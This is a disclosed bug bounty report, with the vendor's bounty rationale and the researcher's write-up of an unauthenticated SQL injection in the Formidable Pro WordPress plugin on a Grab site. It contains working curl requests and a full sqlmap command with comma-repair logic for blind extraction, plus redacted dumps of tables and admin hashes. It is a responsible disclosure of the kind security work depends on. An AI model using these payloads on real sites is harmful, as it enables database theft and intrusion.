@@ -1,0 +1,184 @@
+ReportLink:https://hackerone.com/reports/273946
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/jouko
+ReportedTo:Grabtaxi Holdings Pte Ltd(grab)
+BountyAmount:4500.0
+Severity:high
+State:Closed
+DateOfDisclosure:17.11.2017 6:28:15
+
+Summary:
+The researcher reported that it was possible to exploit previously unknown SQL injection in a WordPress plugin called Formidable Pro which was fixed immediately. He was able to gain read access on wordpress database and provided us all the relevant details (PoC) required for us to reproduce the issue.
+
+_**As also stated on our Policy page:**_
+
+```
+Our rewards are impact-based. This means, for example, that we will issue a relatively high reward
+for a vulnerability that has the potential to leak complete dataset of confidential data, but that we
+will issue  lower reward for a vulnerability that allows an attacker to access to an isolated and limited
+dataset. When we have our reward meetings, we always ask one question: If a malicious attacker
+abuses this, how bad off are we? We assume the worst and pay out the bug accordingly.
+
+If a single fix fixes multiple vulnerabilities, we treat this as a single vulnerability. 
+For example, if you find 3 vulnerabilities in a WordPress plugin we use, and our fix is to remove 
+the plugin, this will receive a single bounty, determined, as always, by impact.
+```
+
+Therefore, in order to be able to accurately identify the overall impact on business, we further investigated to find out the extent of data leakage. During our investigation, we found that database was storing a dataset (representing ~0.6%) containing our driver partners PII.
+
+Researcher also reported 2 other different security issues on same plugin, Formidable Pro. All the 3 vulnerabilities reported were on the latest plugin, and having no updates available at the time by the plugin developers. Deleting the plugin was a single fix.
+
+After assigning the severity based on the data exposure the researcher pointed out that, there is a way to pivot from the DB to wordpress admin dashboard exploiting iThemes-Sync authentication key which was exposed in a database. After our investigation we believe that pivoting was not possible in the context because of the server hardening. We fairly asked him to show specific evidence of his new finding in order to reassess the bounty. Because the SQL injection was already fixed the researcher was not able to perform any remote code execution but he did provided PoC for helping us to reproduce the RCE. From his understanding the only values required for performing RCE was user id and authentication key (which was stored in plaintext in a DB).
+
+While investigating this RCE using researcher's provided PoC we figured out that those two values are not enough for reproducing the RCE because of the following error message:
+
+```
+The hash could not be validated as a correct hash.
+```
+
+On checking with ithemes developers  on email, they responded with the following:
+
+```
+We're using randomly generated salts for each site to build the hashes, but we can't go into specifics, for obvious security reasons.
+```
+
+Since neither we or the researcher were able to confirm the RCE we couldn't reassess the bounty.
+
+Based on above data points collected through our investigation, we decided to award the researcher 4500 USD. Also, to appreciate the researcher for spending valuable time and efforts in submitting other 2 detailed bug reports to us, on the same plugin. Since these 2 bug reports were considered duplicate because of single fix, yet we decided to award 250 USD on each duplicate bug report as well.
+
+Needless to say, we take ALL reported vulnerabilities, very seriously and investigate them to best of our technical abilities. We have awarded 10,000 USD bounty to researchers, who have submitted vulnerabilities with critical impact, in the past and we will continue to do so in the future as well. 
+
+At the end of the day, all these efforts made by H1 triage team, H1 researchers and Grab security team, comes down to overall risk and impact to the business. However, we always aim to be fair. Some researchers won't agree with some of our decisions, but we're paying out to the best of our ethical ability and trust that the majority of researchers will consider their rewards fair and in many cases generous.
+
+We would like to once again thank the researcher for his great report and allowing us to fix this issue. We really appreciate his help in keeping Grab and our customers safe and secure. 
+**Summary:**
+The website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code.
+
+**Description:**
+The plugin allows the site admin to create forms to be filled by users. For this end it implements some AJAX functions, including one to preview (or actually just view) a form. The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users.
+
+The preview function accepts some parameters. Some of them allows the user to specify HTML and WordPress shortcodes (special WordPress markup) to be included with the preview. One of the shortcodes implemented by the Formidable Pro plugin contains an SQL injection vulnerability.
+
+## Browsers Verified In:
+N/A
+
+## Steps To Reproduce:
+Verifying the AJAX preview function with the cURL tool:
+~~~~
+curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'
+~~~~
+This request shows a preset "contact us" form (if form id is not defined, you'll get the first form in the database).
+
+The preview AJAX request accepts some parameters. For example you can define HTML to be shown after the form:
+~~~~
+curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=hello world'
+~~~~
+You see that "hello world" appears on the page after the "Contact us" form.
+
+The HTML may contain WordPress shortcodes which are special markup in square brackets. There are shortcodes implemented by the WordPress core, and shortcodes implemented by plugins. Any of these can be included in the form preview.
+
+The Formidable plugin implements several shortcodes. One of them is [display-frm-data] which displays data that people have entered in a form. It accepts a few parameters, e.g. the form id:
+
+~~~~
+curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'
+~~~~
+
+In the resulting HTML you see some form entries between "XXX" and "YYY".
+
+The [display-frm-data] shortcode also accepts parameters "order_by" and "order" for sorting the entries. The "order_by" parameter can contain a field ID or list of them. The "order" parameter is supposed to contain "ASC" or "DESC" to indicate the sorting direction. These parameters can be used to carry out an SQL injection.
+
+Example:
+~~~~
+curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'
+~~~~
+
+Although this example gives no meaningful output, you should see in the server logs that the "zzz" went in an SQL query which produced an error message.
+
+The shortcode parameters are processed in various ways which makes it very complicated to perform a successful SQL query and retrieve data. However it is possible.
+
+The injected code goes in the ORDER BY clause of an intermediate query that retrieves the list of form entry ID's. Results of the manipulated query aren't directly visible. The attacker can control the order of entries appearing on the page, which is enough to communicate one bit of data from the database.
+
+A further complication is that any comma symbols in the injected data are specially treated and affect the resulting SQL query in a way that creates errors. With careful formatting, however, the query can be salvaged.
+
+I came up with the following sqlmap options to retrieve any data from the database:
+~~~~
+./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order="%2a( true=true )"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(",",",-it.id%2b");order_by="id,"*true.count(",")+"id"'  --test-filter DUAL --tamper commalesslimit -D █████ --sql-query "SELECT ██████████ FROM █████ WHERE id=2"
+~~~~
+This works with the latest sqlmap. The "commalesslimit" tamper module helps avoiding comma symbols in any LIMIT clauses. The --eval parameter does some processing to repair queries that contain commas in the SELECT clause.
+
+Specifically, for each comma appearing in the order parameter, the plugin appends ",it.id" in the query. The repair code appends "-it.id+" after each comma to neutralize the effect. In other words, an injected "SELECT a,b" query would be translated to "SELECT a,it.id b" by the shortcode logic. The repair code changes it to "SELECT a, it.id-it.id+b" which evaluates to the original injected query.
+
+Result of the above sqlmap command:
+~~~~
+[03:09:30] [INFO] testing █████
+[03:09:30] [INFO] confirming ██████
+[03:09:30] [INFO] the back-end DBMS is ███
+web application technology: █████
+back-end DBMS: ███████
+[03:09:30] [INFO] fetching SQL SELECT statement query output: 'SELECT ███████ FROM ████ WHERE id=2'
+[03:09:30] [INFO] retrieved: 1
+[03:09:43] [INFO] retrieving the length of query output
+[03:09:43] [INFO] ███
+[03:10:46] [INFO] retrieved: █████             
+SELECT ██████ FROM ████ WHERE id=2 [1]:
+[*] ██████████
+~~~~
+
+## Supporting Material/References:
+
+As a proof of concept I retrieved some data.
+
+Tables in the database:
+~~~~
+[██████████]
++---------------------------------+
+| █████████      |
+| █████████          |
+| █████████        |
+| ███████     |
+| ██████████ |
+| ███████         |
+| ██████████      |
+| ████ |
+| ██████████                |
+| ███                   |
+| ████████ |
+| █████████                 |
+| █████                  |
+| ███             |
+| █████████                  |
+| ███████ |
+| ███████         |
+| ██████████       |
+| ████             |
+| █████                  |
+| ██████████ |
+| ███                      |
+| █████                    |
+| ██████████                   |
+| ██████████                      |
+| ████████ |
+| █████████              |
+| ████                   |
+| ██████                      |
+| ████████                   |
+| ██████                      |
++---------------------------------+
+~~~~
+
+Administrator users and their password hashes:
+
+~~~~
+█████
+█████
+██████
+████████
+███
+█████
+████████
+~~~~
+
+Webroot path:
+~~~~
+███
+~~~~
